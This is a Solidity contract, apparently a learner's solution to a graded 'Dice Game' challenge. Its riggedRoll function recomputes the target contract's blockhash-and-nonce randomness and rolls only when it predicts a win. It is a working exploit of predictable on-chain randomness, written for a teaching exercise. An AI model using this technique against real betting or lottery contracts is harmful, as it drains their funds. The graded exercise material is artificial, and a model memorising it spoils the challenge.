pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable to, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Not enough funds");
        (bool sent, ) = to.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() external {
        require(address(this).balance >= 0.002 ether, "Not enough ETH in RiggedRoll");

        bytes32 prevHash = blockhash(block.number - 1);
        
        uint256 nonce = diceGame.nonce();
        
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), nonce)
        );
        
        uint256 predictedRoll = uint256(hash) % 16;

        if (predictedRoll <= 5) {
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            console.log("Roll > 5, skipping to avoid loss.");
        }
    }
    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
